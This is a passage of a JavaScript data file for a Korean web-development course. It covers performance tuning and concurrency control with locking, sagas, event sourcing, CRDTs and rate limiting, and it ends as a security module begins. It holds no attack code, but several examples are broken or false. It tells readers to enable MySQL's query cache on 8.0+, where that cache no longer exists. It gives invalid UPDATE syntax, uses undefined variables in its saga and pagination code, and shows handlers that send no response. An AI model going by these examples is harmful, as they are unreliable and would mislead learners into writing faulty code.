  maxAge: '1y', // 1년 캐싱
  immutable: true
}));

// 정적 파일별로 다르게 설정
app.get('/api/*', (req, res) => {
  res.set('Cache-Control', 'no-cache'); // API는 캐시 안 함
});

app.get('/static/*', (req, res) => {
  res.set('Cache-Control', 'public, max-age=31536000'); // 이미지/CSS/JS는 1년
});

// Nginx 설정 예시
location ~* \\.(jpg|jpeg|png|gif|ico|css|js)$ {
  expires 1y;
  add_header Cache-Control "public, immutable";
}`
                },
                {
                  heading: "4. CDN 활용하기",
                  content: "정적 파일을 CDN에 올리면 전 세계 어디서나 빠르게 로딩됩니다.",
                  steps: [
                    {
                      label: "Cloudflare CDN (무료) 설정",
                      code: `# 1. Cloudflare 계정 생성
# 2. 도메인 추가
# 3. 네임서버 변경
# 4. Speed → Optimization 설정:
   - Auto Minify: HTML, CSS, JS 체크
   - Brotli 압축 활성화
   - 이미지 최적화 (Polish) 활성화

# 효과:
- 서버 부하 70% 감소
- 로딩 속도 50% 향상 (해외 사용자)
- HTTPS 자동 적용`
                    }
                  ]
                },
                {
                  heading: "5. Lazy Loading 구현",
                  code: `// 이미지 Lazy Load (네이티브 방식)
<img src="product.jpg" loading="lazy" alt="Product">

// JavaScript 번들 Lazy Load (React 예시)
import { lazy, Suspense } from 'react';

const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}

// 효과:
- 초기 번들 크기: 500KB → 200KB (60% 감소)
- FCP: 2.5s → 1.2s (52% 개선)`
                },
                {
                  heading: "6. Database 쿼리 최적화",
                  code: `// 문제: N+1 쿼리
products.forEach(async (product) => {
  const category = await db.query(
    'SELECT * FROM categories WHERE id = ?',
    [product.category_id]
  );
  // 100개 상품 → 100번 쿼리
});

// 해결: JOIN으로 한 번에
const products = await db.query(\`
  SELECT p.*, c.name as category_name
  FROM products p
  LEFT JOIN categories c ON p.category_id = c.id
\`);
// 1번 쿼리로 해결

// Redis 캐싱 추가
const cacheKey = 'products:all';
let products = await redis.get(cacheKey);

if (!products) {
  products = await db.query('SELECT * FROM products');
  await redis.setex(cacheKey, 300, JSON.stringify(products)); // 5분 캐시
}`
                },
                {
                  heading: "⚡ 중급 실습 과제",
                  checklist: [
                    "Performance 탭으로 메인 스레드 병목 구간 찾아서 스크린샷",
                    "가장 느린 API 엔드포인트 3개 찾고 응답 시간 기록",
                    "정적 파일에 1년 캐시 헤더 설정 후 Network 탭에서 확인",
                    "이미지 lazy loading 적용 후 LCP 개선 확인",
                    "Cloudflare CDN 연결 후 전/후 속도 비교 (GTmetrix 사용)"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 실시간 모니터링과 자동화된 성능 관리",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "성능을 실시간으로 모니터링하고, 자동으로 개선하는 시스템을 구축할 수 있다."
                },
                {
                  heading: "1. Real User Monitoring (RUM) 구축",
                  content: "실제 사용자의 경험을 측정하는 시스템:",
                  code: `// Frontend에서 Core Web Vitals 측정
import { getCLS, getFID, getLCP } from 'web-vitals';

function sendToAnalytics({ name, delta, id }) {
  fetch('/api/analytics', {
    method: 'POST',
    body: JSON.stringify({
      metric: name,
      value: delta,
      id: id,
      url: window.location.href,
      userAgent: navigator.userAgent
    }),
    headers: { 'Content-Type': 'application/json' }
  });
}

getCLS(sendToAnalytics);
getFID(sendToAnalytics);
getLCP(sendToAnalytics);

// Backend에서 저장 (MongoDB 예시)
app.post('/api/analytics', async (req, res) => {
  await db.collection('metrics').insertOne({
    ...req.body,
    timestamp: new Date()
  });
  res.sendStatus(200);
});`
                },
                {
                  heading: "2. Lighthouse CI 자동화",
                  content: "Pull Request마다 자동으로 성능 점검:",
                  code: `# .github/workflows/lighthouse.yml
name: Lighthouse CI
on: [pull_request]

jobs:
  lighthouse:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run build

      - name: Run Lighthouse CI
        run: |
          npm install -g @lhci/cli
          lhci autorun
        env:
          LHCI_GITHUB_APP_TOKEN: \${{ secrets.LHCI_GITHUB_APP_TOKEN }}

# lighthouserc.json
{
  "ci": {
    "collect": {
      "url": ["http://localhost:3000"],
      "startServerCommand": "npm start"
    },
    "assert": {
      "assertions": {
        "categories:performance": ["error", {"minScore": 0.9}],
        "first-contentful-paint": ["error", {"maxNumericValue": 2000}],
        "interactive": ["error", {"maxNumericValue": 3500}]
      }
    }
  }
}

# 효과: 성능 점수 90 미만이면 PR merge 차단`
                },
                {
                  heading: "3. 성능 예산 (Performance Budget) 설정",
                  code: `// webpack-bundle-analyzer로 번들 크기 모니터링
// package.json
{
  "scripts": {
    "analyze": "webpack-bundle-analyzer dist/stats.json"
  }
}

// 번들 크기 제한 설정
// webpack.config.js
module.exports = {
  performance: {
    maxAssetSize: 244000, // 244KB
    maxEntrypointSize: 244000,
    hints: 'error' // 초과 시 빌드 실패
  }
};

// 이미지 크기 자동 최적화
// vite.config.js
import imagemin from 'vite-plugin-imagemin';

export default {
  plugins: [
    imagemin({
      gifsicle: { optimizationLevel: 7 },
      optipng: { optimizationLevel: 7 },
      mozjpeg: { quality: 80 },
      webp: { quality: 80 }
    })
  ]
};`
                },
                {
                  heading: "4. 서버 사이드 렌더링 (SSR) 최적화",
                  code: `// Next.js에서 증분 정적 재생성 (ISR)
export async function getStaticProps() {
  const products = await fetchProducts();

  return {
    props: { products },
    revalidate: 60 // 60초마다 재생성
  };
}

// 효과:
// 1. 초기 로딩: HTML이 즉시 표시 (LCP 0.8s)
// 2. 캐시: 60초 동안 정적 파일 제공
// 3. 업데이트: 백그라운드에서 자동 재생성

// Edge Functions로 지역별 최적화
export const config = {
  runtime: 'edge'
};

export default async function handler(req) {
  const country = req.geo.country;
  const products = await getProductsByCountry(country);

  return new Response(JSON.stringify(products), {
    headers: {
      'Cache-Control': 's-maxage=3600, stale-while-revalidate'
    }
  });
}`
                },
                {
                  heading: "5. Database 연결 풀링과 쿼리 캐싱",
                  code: `// MySQL 연결 풀 최적화
const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'cms',
  connectionLimit: 20, // 최대 20개 연결
  queueLimit: 0,
  waitForConnections: true,
  enableKeepAlive: true,
  keepAliveInitialDelay: 0
});

// Query Result Caching (MySQL 8.0+)
SET GLOBAL query_cache_type = ON;
SET GLOBAL query_cache_size = 67108864; // 64MB

// 또는 Application Level Caching
const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 600 }); // 10분

app.get('/api/products', async (req, res) => {
  const cacheKey = \`products_\${req.query.page}\`;

  let data = cache.get(cacheKey);
  if (data) {
    return res.json({ data, cached: true });
  }

  data = await pool.query('SELECT * FROM products LIMIT ?, 20', [offset]);
  cache.set(cacheKey, data);

  res.json({ data, cached: false });
});`
                },
                {
                  heading: "6. APM (Application Performance Monitoring) 도구",
                  steps: [
                    {
                      label: "New Relic 설정 (무료 플랜)",
                      code: `# 1. New Relic 계정 생성
# 2. Node.js 에이전트 설치
npm install newrelic

# 3. newrelic.js 설정
exports.config = {
  app_name: ['My CMS'],
  license_key: 'YOUR_LICENSE_KEY',
  logging: {
    level: 'info'
  }
};

# 4. 앱 시작 시 로드
// index.js 최상단
require('newrelic');
const express = require('express');

# 모니터링 가능:
- 응답 시간 분포 (p50, p95, p99)
- 느린 트랜잭션 자동 탐지
- DB 쿼리 성능 추적
- 에러율 및 스택 트레이스`
                    },
                    {
                      label: "Sentry로 성능 모니터링",
                      code: `import * as Sentry from '@sentry/node';

Sentry.init({
  dsn: 'YOUR_DSN',
  tracesSampleRate: 0.1, // 10% 트랜잭션 추적
  integrations: [
    new Sentry.Integrations.Http({ tracing: true }),
    new Sentry.Integrations.Express({ app })
  ]
});

// 느린 API 자동 감지
app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.tracingHandler());

// 커스텀 성능 측정
const transaction = Sentry.startTransaction({
  op: 'db.query',
  name: 'Fetch Products'
});

const products = await db.query('SELECT * FROM products');

transaction.finish();`
                    }
                  ]
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "web-vitals 라이브러리로 RUM 구축 후 7일간 데이터 수집",
                    "Lighthouse CI를 GitHub Actions에 통합하여 자동 점검",
                    "번들 크기 200KB 이하로 제한하고 초과 시 빌드 실패 설정",
                    "Next.js ISR 또는 SSR 적용 후 LCP 2초 이내 달성",
                    "New Relic 또는 Sentry 연동 후 p95 응답 시간 500ms 이하 유지"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '3-2',
          name: '동시성 제어와 Race Condition',
          goal: '여러 사용자가 동시에 데이터를 수정할 때 생기는 문제를 해결할 수 있다',
          hours: 10,
          keywords: ['race condition', 'concurrency control', 'database locking'],
          tasks: [
            '2개 브라우저로 동시 수정 테스트',
            '충돌 상황 재현',
            '간단한 잠금 메커니즘 구현'
          ],
          content: {
            beginner: {
              title: "초급: Race Condition이 무엇인지 이해하고 문제 재현하기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "동시성 문제가 무엇인지 이해하고, 실제로 문제를 재현해볼 수 있다."
                },
                {
                  heading: "1. Race Condition이란?",
                  content: "여러 사용자가 동시에 같은 데이터를 수정할 때 발생하는 문제입니다.",
                  code: `# 시나리오: 재고 10개인 상품을 두 명이 동시 구매
시간  |  사용자A          |  사용자B          |  실제 재고
-----|------------------|------------------|----------
1초   | 재고 확인 (10개) |                  | 10
2초   | 1개 구매 결정    | 재고 확인 (10개) | 10
3초   | 재고 = 10-1 = 9  | 1개 구매 결정    | 10
4초   | 저장 (9개)       | 재고 = 10-1 = 9  | 9
5초   |                  | 저장 (9개)       | 9 ← 버그!

# 문제: 2개 팔렸는데 재고는 1개만 줄어듦
# 원인: 두 사용자가 같은 초기값(10)을 읽었기 때문`
                },
                {
                  heading: "2. 실제 발생하는 문제 사례",
                  list: [
                    "이커머스: 재고 10개인데 15명이 구매 성공 → 마이너스 재고",
                    "은행 앱: 잔액 1만원인데 동시 출금으로 2만원 인출",
                    "좋아요 기능: 100개였는데 동시 클릭으로 101이 아닌 99로 변경",
                    "게시글 조회수: 정확하지 않은 카운팅"
                  ]
                },
                {
                  heading: "3. 문제 재현하기 (브라우저 2개)",
                  steps: [
                    {
                      label: "테스트 페이지 준비",
                      code: `<!-- test-race.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>재고 관리 테스트</h1>
  <p>현재 재고: <span id="stock">10</span>개</p>
  <button onclick="buyProduct()">구매하기 (1개)</button>

  <script>
    async function buyProduct() {
      // 1. 현재 재고 읽기
      const response = await fetch('/api/stock');
      const { stock } = await response.json();

      console.log('현재 재고:', stock);

      // 2. 1초 대기 (동시 실행 시뮬레이션)
      await new Promise(r => setTimeout(r, 1000));

      // 3. 재고 감소시켜서 저장
      await fetch('/api/stock', {
        method: 'PUT',
        body: JSON.stringify({ stock: stock - 1 }),
        headers: { 'Content-Type': 'application/json' }
      });

      // 4. 화면 업데이트
      document.getElementById('stock').textContent = stock - 1;
    }
  </script>
</body>
</html>`
                    },
                    {
                      label: "백엔드 API (Express.js)",
                      code: `let stock = 10; // 초기 재고

app.get('/api/stock', (req, res) => {
  res.json({ stock });
});

app.put('/api/stock', (req, res) => {
  stock = req.body.stock;
  console.log('재고 업데이트:', stock);
  res.json({ stock });
});`
                    },
                    {
                      label: "재현 방법",
                      code: `1. 브라우저 2개 열기 (Chrome, Edge 또는 시크릿 모드)
2. 양쪽 모두 http://localhost:3000/test-race.html 접속
3. 동시에 "구매하기" 버튼 클릭 (0.5초 차이 내)

# 예상 결과: 재고 8개 (10 - 1 - 1)
# 실제 결과: 재고 9개 (버그!)

# 로그:
[브라우저A] 현재 재고: 10
[브라우저B] 현재 재고: 10
[서버] 재고 업데이트: 9
[서버] 재고 업데이트: 9 ← 문제 발생!`
                    }
                  ]
                },
                {
                  heading: "4. 간단한 해결책: Optimistic Locking (낙관적 잠금)",
                  code: `// 버전 번호를 추가
let stock = 10;
let version = 1;

app.put('/api/stock', (req, res) => {
  const { newStock, clientVersion } = req.body;

  // 버전이 다르면 실패
  if (clientVersion !== version) {
    return res.status(409).json({
      error: '다른 사용자가 먼저 수정했습니다. 새로고침 후 다시 시도하세요.'
    });
  }

  // 버전이 같으면 업데이트
  stock = newStock;
  version++; // 버전 증가
  res.json({ stock, version });
});

// Frontend 수정
async function buyProduct() {
  const { stock, version } = await fetch('/api/stock').then(r => r.json());

  await new Promise(r => setTimeout(r, 1000));

  const response = await fetch('/api/stock', {
    method: 'PUT',
    body: JSON.stringify({
      newStock: stock - 1,
      clientVersion: version // 버전 포함
    }),
    headers: { 'Content-Type': 'application/json' }
  });

  if (response.status === 409) {
    alert('다른 사용자가 먼저 구매했습니다. 다시 시도해주세요.');
    location.reload();
  }
}`
                },
                {
                  heading: "5. MySQL에서 Optimistic Locking",
                  code: `-- 테이블에 version 컬럼 추가
ALTER TABLE products ADD COLUMN version INT DEFAULT 1;

-- 업데이트 쿼리 (버전 체크)
UPDATE products
SET stock = stock - 1,
    version = version + 1
WHERE id = 123
  AND version = ?; -- 클라이언트가 읽은 버전

-- 결과:
-- affected rows = 1: 성공
-- affected rows = 0: 실패 (다른 사용자가 먼저 수정함)`
                },
                {
                  heading: "💡 초급 실습 과제",
                  checklist: [
                    "위 HTML 파일로 Race Condition 재현 후 스크린샷",
                    "브라우저 개발자 도구 Console에서 로그 확인",
                    "Optimistic Locking 적용 후 다시 테스트",
                    "충돌 시 에러 메시지 표시되는지 확인"
                  ]
                }
              ]
            },
            intermediate: {
              title: "중급: 데이터베이스 잠금과 트랜잭션으로 해결하기",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "데이터베이스 잠금 메커니즘과 트랜잭션 격리 수준을 이해하고 적용할 수 있다."
                },
                {
                  heading: "1. Pessimistic Locking (비관적 잠금)",
                  content: "데이터를 읽을 때 미리 잠금을 걸어서 다른 사용자의 접근을 차단합니다.",
                  code: `// MySQL에서 FOR UPDATE 사용
START TRANSACTION;

SELECT stock FROM products
WHERE id = 123
FOR UPDATE; -- 이 행을 잠금 (다른 트랜잭션은 대기)

-- stock이 10이라고 가정
UPDATE products
SET stock = 10 - 1
WHERE id = 123;

COMMIT; -- 잠금 해제

// Node.js 구현
app.post('/api/purchase', async (req, res) => {
  const connection = await pool.getConnection();

  try {
    await connection.beginTransaction();

    // 1. 잠금을 걸고 재고 조회
    const [rows] = await connection.query(
      'SELECT stock FROM products WHERE id = ? FOR UPDATE',
      [req.body.productId]
    );

    const currentStock = rows[0].stock;

    if (currentStock < 1) {
      throw new Error('재고 부족');
    }

    // 2. 재고 감소
    await connection.query(
      'UPDATE products SET stock = stock - 1 WHERE id = ?',
      [req.body.productId]
    );

    await connection.commit();
    res.json({ success: true, remainingStock: currentStock - 1 });

  } catch (error) {
    await connection.rollback();
    res.status(400).json({ error: error.message });
  } finally {
    connection.release();
  }
});`
                },
                {
                  heading: "2. 트랜잭션 격리 수준 (Isolation Level)",
                  code: `# MySQL 격리 수준 4단계

# 1. READ UNCOMMITTED (커밋 안 된 데이터도 읽음)
- 문제: Dirty Read (롤백될 데이터 읽음)
- 사용: 거의 안 함

# 2. READ COMMITTED (커밋된 데이터만 읽음)
- 문제: Non-repeatable Read (같은 쿼리가 다른 결과)
- 사용: PostgreSQL 기본값

# 3. REPEATABLE READ (같은 트랜잭션 내 일관된 읽기)
- 문제: Phantom Read (새로운 행 추가 감지 못함)
- 사용: MySQL 기본값 ← 대부분 이걸 사용

# 4. SERIALIZABLE (완전 격리)
- 문제: 성능 저하 (순차 실행)
- 사용: 금융권 중요 거래

-- 설정 방법
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;

-- 현재 설정 확인
SELECT @@transaction_isolation;`
                },
                {
                  heading: "3. Deadlock (교착 상태) 이해하고 해결하기",
                  code: `# Deadlock 발생 시나리오

시간 | 트랜잭션 A                    | 트랜잭션 B
-----|------------------------------|-----------------------------
1초  | SELECT * FROM orders WHERE id=1 FOR UPDATE |
2초  |                              | SELECT * FROM orders WHERE id=2 FOR UPDATE
3초  | SELECT * FROM orders WHERE id=2 FOR UPDATE (대기) |
4초  |                              | SELECT * FROM orders WHERE id=1 FOR UPDATE (대기)
5초  | [Deadlock 발생!]             | [Deadlock 발생!]

-- MySQL은 자동으로 하나를 롤백:
ERROR 1213: Deadlock found when trying to get lock

# 해결 방법 1: 항상 같은 순서로 잠금
// Bad (교착 상태 가능)
UPDATE orders WHERE id = 2;
UPDATE orders WHERE id = 1;

// Good (ID 순서대로)
UPDATE orders WHERE id IN (1, 2) ORDER BY id;

# 해결 방법 2: 잠금 타임아웃 설정
SET SESSION innodb_lock_wait_timeout = 5; -- 5초 대기 후 실패

# 해결 방법 3: 재시도 로직
async function updateWithRetry(query, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await db.query(query);
    } catch (error) {
      if (error.code === 'ER_LOCK_DEADLOCK' && i < maxRetries - 1) {
        await new Promise(r => setTimeout(r, 100 * (i + 1))); // 지수 백오프
        continue;
      }
      throw error;
    }
  }
}`
                },
                {
                  heading: "4. Redis를 이용한 분산 잠금",
                  content: "여러 서버가 있을 때는 Redis로 잠금을 관리합니다.",
                  code: `const Redis = require('ioredis');
const redis = new Redis();

// Redlock 알고리즘 구현
async function acquireLock(key, ttl = 5000) {
  const lockKey = \`lock:\${key}\`;
  const lockValue = Date.now() + ttl;

  // SET NX: 키가 없을 때만 설정
  const result = await redis.set(
    lockKey,
    lockValue,
    'PX', ttl, // milliseconds
    'NX'       // Not eXists
  );

  return result === 'OK';
}

async function releaseLock(key) {
  await redis.del(\`lock:\${key}\`);
}

// 사용 예시
app.post('/api/purchase', async (req, res) => {
  const productId = req.body.productId;
  const lockKey = \`product:\${productId}\`;

  // 1. 잠금 시도
  const locked = await acquireLock(lockKey, 3000);

  if (!locked) {
    return res.status(409).json({
      error: '다른 사용자가 처리 중입니다. 잠시 후 다시 시도해주세요.'
    });
  }

  try {
    // 2. 재고 확인 및 차감
    const stock = await db.query(
      'SELECT stock FROM products WHERE id = ?',
      [productId]
    );

    if (stock[0].stock < 1) {
      throw new Error('재고 부족');
    }

    await db.query(
      'UPDATE products SET stock = stock - 1 WHERE id = ?',
      [productId]
    );

    res.json({ success: true });

  } finally {
    // 3. 잠금 해제
    await releaseLock(lockKey);
  }
});`
                },
                {
                  heading: "5. 실전: 선착순 이벤트 구현",
                  code: `// 문제: 100명 한정 쿠폰을 1000명이 동시 요청
// 해결: Redis INCR (원자적 연산)

app.post('/api/coupon/claim', async (req, res) => {
  const eventId = req.body.eventId;
  const userId = req.user.id;
  const key = \`event:\${eventId}:count\`;

  // 1. 원자적으로 카운트 증가
  const count = await redis.incr(key);

  // 2. 100명 초과 시 실패
  if (count > 100) {
    return res.status(410).json({
      error: '마감되었습니다.'
    });
  }

  // 3. 쿠폰 발급
  await db.query(
    'INSERT INTO coupons (event_id, user_id) VALUES (?, ?)',
    [eventId, userId]
  );

  res.json({
    success: true,
    yourNumber: count // 몇 번째 당첨자인지
  });
});

// TTL 설정 (24시간 후 자동 삭제)
await redis.expire(\`event:\${eventId}:count\`, 86400);`
                },
                {
                  heading: "⚡ 중급 실습 과제",
                  checklist: [
                    "FOR UPDATE로 Pessimistic Locking 구현 후 동시 요청 테스트",
                    "Deadlock 의도적으로 발생시키고 에러 로그 확인",
                    "Redis 분산 잠금으로 선착순 이벤트 구현 (100명 한정)",
                    "Apache Bench로 동시 요청 1000개 보내서 정확히 100명만 성공하는지 확인",
                    "트랜잭션 격리 수준 변경 후 동작 차이 테스트"
                  ]
                }
              ]
            },
            advanced: {
              title: "고급: 분산 시스템에서의 동시성 제어와 이벤트 소싱",
              sections: [
                {
                  heading: "📚 학습 목표",
                  content: "분산 환경에서 동시성을 제어하고, 이벤트 소싱 패턴을 이해할 수 있다."
                },
                {
                  heading: "1. 분산 트랜잭션 (2PC - Two Phase Commit)",
                  content: "여러 데이터베이스에 걸친 트랜잭션을 안전하게 처리하는 방법:",
                  code: `// 문제: 주문 DB와 재고 DB가 분리된 경우
// 주문은 성공했는데 재고 차감 실패 → 데이터 불일치

// 2단계 커밋 프로토콜
class DistributedTransaction {
  async execute() {
    const participants = [orderDB, inventoryDB, paymentDB];

    // Phase 1: Prepare (준비 단계)
    try {
      for (const db of participants) {
        await db.prepare(); // 트랜잭션 시작, 잠금 획득
      }
    } catch (error) {
      // 하나라도 실패하면 모두 롤백
      for (const db of participants) {
        await db.rollback();
      }
      throw error;
    }

    // Phase 2: Commit (커밋 단계)
    try {
      for (const db of participants) {
        await db.commit();
      }
    } catch (error) {
      // 치명적 오류: 수동 복구 필요
      console.error('Commit failed:', error);
      // 보상 트랜잭션 실행
    }
  }
}

// 실제 구현 (Saga 패턴)
async function createOrder(orderData) {
  const sagaId = uuid();

  try {
    // 1. 주문 생성
    const order = await orderDB.create(orderData);

    // 2. 재고 차감
    await inventoryDB.decreaseStock(order.productId, order.quantity);

    // 3. 결제 처리
    await paymentDB.charge(order.userId, order.amount);

    return order;

  } catch (error) {
    // 보상 트랜잭션 (Compensating Transaction)
    await orderDB.cancel(order.id);
    await inventoryDB.increaseStock(order.productId, order.quantity);
    // 결제는 아직 안 했으므로 보상 불필요

    throw error;
  }
}`
                },
                {
                  heading: "2. Redlock (Redis 분산 잠금 알고리즘)",
                  content: "여러 Redis 인스턴스에서 안전하게 잠금을 관리:",
                  code: `const Redlock = require('redlock');
const Redis = require('ioredis');

// 최소 3개의 Redis 인스턴스 (홀수 권장)
const redisA = new Redis({ host: 'redis1.example.com' });
const redisB = new Redis({ host: 'redis2.example.com' });
const redisC = new Redis({ host: 'redis3.example.com' });

const redlock = new Redlock(
  [redisA, redisB, redisC],
  {
    driftFactor: 0.01,
    retryCount: 10,
    retryDelay: 200,
    retryJitter: 200
  }
);

// 잠금 획득
app.post('/api/limited-offer', async (req, res) => {
  const resource = 'limited-offer:item123';
  const ttl = 5000; // 5초

  let lock;
  try {
    // 과반수(2/3) Redis에서 잠금 획득 성공해야 함
    lock = await redlock.acquire([resource], ttl);

    // 비즈니스 로직 실행
    const stock = await db.query('SELECT stock FROM products WHERE id = 123');

    if (stock[0].stock > 0) {
      await db.query('UPDATE products SET stock = stock - 1 WHERE id = 123');
      res.json({ success: true });
    } else {
      res.status(410).json({ error: '품절' });
    }

  } catch (error) {
    res.status(409).json({ error: '잠시 후 다시 시도해주세요' });

  } finally {
    if (lock) {
      await lock.release();
    }
  }
});`
                },
                {
                  heading: "3. 이벤트 소싱 (Event Sourcing) 패턴",
                  content: "상태를 직접 저장하지 않고 이벤트 시퀀스로 저장하여 동시성 문제 해결:",
                  code: `// 기존 방식 (상태 저장)
UPDATE accounts SET balance = balance - 100 WHERE id = 123;
// 문제: 동시 출금 시 Race Condition 발생

// 이벤트 소싱 (이벤트 저장)
// events 테이블
// id | aggregate_id | event_type | amount | timestamp | version
// 1  | acc-123      | Deposited  | 1000   | ...       | 1
// 2  | acc-123      | Withdrawn  | 100    | ...       | 2
// 3  | acc-123      | Withdrawn  | 50     | ...       | 3

class BankAccount {
  constructor(accountId) {
    this.accountId = accountId;
    this.balance = 0;
    this.version = 0;
  }

  // 이벤트 적용
  apply(event) {
    switch (event.type) {
      case 'Deposited':
        this.balance += event.amount;
        break;
      case 'Withdrawn':
        this.balance -= event.amount;
        break;
    }
    this.version = event.version;
  }

  // 상태 복원
  static async load(accountId) {
    const account = new BankAccount(accountId);

    const events = await db.query(
      'SELECT * FROM events WHERE aggregate_id = ? ORDER BY version',
      [accountId]
    );

    events.forEach(event => account.apply(event));
    return account;
  }

  // 출금 커맨드
  async withdraw(amount) {
    if (this.balance < amount) {
      throw new Error('잔액 부족');
    }

    const event = {
      aggregate_id: this.accountId,
      type: 'Withdrawn',
      amount: amount,
      version: this.version + 1
    };

    // Optimistic Concurrency Control
    const result = await db.query(\`
      INSERT INTO events (aggregate_id, event_type, amount, version)
      SELECT ?, ?, ?, ?
      WHERE NOT EXISTS (
        SELECT 1 FROM events
        WHERE aggregate_id = ? AND version >= ?
      )
    \`, [
      this.accountId, event.type, event.amount, event.version,
      this.accountId, event.version
    ]);

    if (result.affectedRows === 0) {
      throw new Error('다른 사용자가 먼저 처리했습니다. 다시 시도해주세요.');
    }

    this.apply(event);
  }
}

// 사용
const account = await BankAccount.load('acc-123');
await account.withdraw(100);`
                },
                {
                  heading: "4. CQRS (Command Query Responsibility Segregation)",
                  content: "읽기와 쓰기를 분리하여 성능과 확장성 향상:",
                  code: `// Write Model (명령 처리)
class OrderCommandHandler {
  async createOrder(command) {
    // 1. 이벤트 생성
    const event = {
      type: 'OrderCreated',
      orderId: uuid(),
      userId: command.userId,
      items: command.items,
      timestamp: new Date()
    };

    // 2. 이벤트 스토어에 저장
    await eventStore.append('orders', event);

    // 3. 이벤트 발행 (Message Queue)
    await eventBus.publish('order.created', event);
  }
}

// Read Model (조회 최적화)
// 이벤트를 구독하여 읽기 전용 DB 업데이트
eventBus.subscribe('order.created', async (event) => {
  // MongoDB에 비정규화된 데이터 저장
  await readDB.collection('orders').insertOne({
    orderId: event.orderId,
    userId: event.userId,
    items: event.items,
    userName: await getUserName(event.userId), // Join 미리 수행
    totalAmount: calculateTotal(event.items),
    createdAt: event.timestamp
  });

  // Elasticsearch에 검색용 인덱스 생성
  await searchIndex.index({
    index: 'orders',
    id: event.orderId,
    body: {
      orderId: event.orderId,
      items: event.items.map(i => i.name).join(' '),
      createdAt: event.timestamp
    }
  });
});

// 조회 API (읽기 전용 DB 사용)
app.get('/api/orders/:userId', async (req, res) => {
  const orders = await readDB.collection('orders').find({
    userId: req.params.userId
  }).toArray();

  res.json(orders); // 빠른 조회, JOIN 불필요
});`
                },
                {
                  heading: "5. CRDTs (Conflict-free Replicated Data Types)",
                  content: "분산 시스템에서 자동으로 충돌 해결하는 자료구조:",
                  code: `// 예시: 협업 문서 편집 (Google Docs 같은)
// G-Counter (증가만 가능한 카운터)
class GCounter {
  constructor(nodeId) {
    this.nodeId = nodeId;
    this.counts = {}; // { node1: 5, node2: 3 }
  }

  increment() {
    this.counts[this.nodeId] = (this.counts[this.nodeId] || 0) + 1;
  }

  value() {
    return Object.values(this.counts).reduce((a, b) => a + b, 0);
  }

  merge(other) {
    for (const [node, count] of Object.entries(other.counts)) {
      this.counts[node] = Math.max(
        this.counts[node] || 0,
        count
      );
    }
  }
}

// 사용 (좋아요 카운터)
const counter1 = new GCounter('server1');
const counter2 = new GCounter('server2');

counter1.increment(); // server1에서 +1
counter2.increment(); // server2에서 +1
counter2.increment(); // server2에서 +1

console.log(counter1.value()); // 1
console.log(counter2.value()); // 2

// 동기화 (네트워크 복구 후)
counter1.merge(counter2);
console.log(counter1.value()); // 3 (자동 병합!)

// LWW-Element-Set (Last-Write-Wins Set)
// 실시간 협업 태그 편집에 사용
class LWWSet {
  constructor() {
    this.adds = {}; // { 'tag1': timestamp }
    this.removes = {}; // { 'tag1': timestamp }
  }

  add(element) {
    this.adds[element] = Date.now();
  }

  remove(element) {
    this.removes[element] = Date.now();
  }

  has(element) {
    const addTime = this.adds[element] || 0;
    const removeTime = this.removes[element] || 0;
    return addTime > removeTime; // 더 최근 타임스탬프 우선
  }

  merge(other) {
    for (const [elem, time] of Object.entries(other.adds)) {
      this.adds[elem] = Math.max(this.adds[elem] || 0, time);
    }
    for (const [elem, time] of Object.entries(other.removes)) {
      this.removes[elem] = Math.max(this.removes[elem] || 0, time);
    }
  }
}`
                },
                {
                  heading: "6. 실전: 분산 속도 제한 (Rate Limiting)",
                  code: `// Redis를 이용한 분산 Rate Limiter
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

const limiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:'
  }),
  windowMs: 60 * 1000, // 1분
  max: 100, // 100 요청
  message: '너무 많은 요청입니다. 1분 후 다시 시도해주세요.',
  standardHeaders: true,
  legacyHeaders: false
});

app.use('/api/', limiter);

// Sliding Window Log 알고리즘 (더 정확한 제한)
async function checkRateLimit(userId, limit = 100, window = 60) {
  const key = \`rate:\${userId}\`;
  const now = Date.now();
  const windowStart = now - (window * 1000);

  // 1. 오래된 기록 삭제
  await redis.zremrangebyscore(key, 0, windowStart);

  // 2. 현재 윈도우 내 요청 수 확인
  const count = await redis.zcard(key);

  if (count >= limit) {
    return false; // 제한 초과
  }

  // 3. 현재 요청 기록
  await redis.zadd(key, now, \`\${now}:\${Math.random()}\`);
  await redis.expire(key, window);

  return true; // 허용
}

app.post('/api/action', async (req, res) => {
  const allowed = await checkRateLimit(req.user.id, 10, 60);

  if (!allowed) {
    return res.status(429).json({
      error: '1분에 10번까지만 가능합니다.'
    });
  }

  // 비즈니스 로직
});`
                },
                {
                  heading: "⚡ 고급 실습 과제",
                  checklist: [
                    "Redlock으로 다중 Redis 분산 잠금 구현 후 한 Redis 다운시켜도 정상 동작 확인",
                    "이벤트 소싱 패턴으로 은행 계좌 시스템 구현 (입금/출금 이벤트)",
                    "CQRS 패턴으로 주문 시스템 구현 (쓰기용 MySQL, 읽기용 MongoDB)",
                    "G-Counter로 분산 좋아요 카운터 구현 후 여러 서버 동기화",
                    "Sliding Window Log 알고리즘으로 API Rate Limiter 구현 (분당 100회)"
                  ]
                }
              ]
            }
          }
        },
        {
          id: '3-3',
          name: '보안 기초',
          goal: '기본적인 보안 위협을 이해하고 대응할 수 있다',
          hours: 12,
          keywords: ['web security', 'SQL injection', 'authentication'],
          tasks: [
            'SQL Injection 공격 시뮬레이션',
            '현재 사용 중인 인증 방식 파악',
            'SSL 인증서 만료일 확인'
          ],
          content: {
            beginner: {
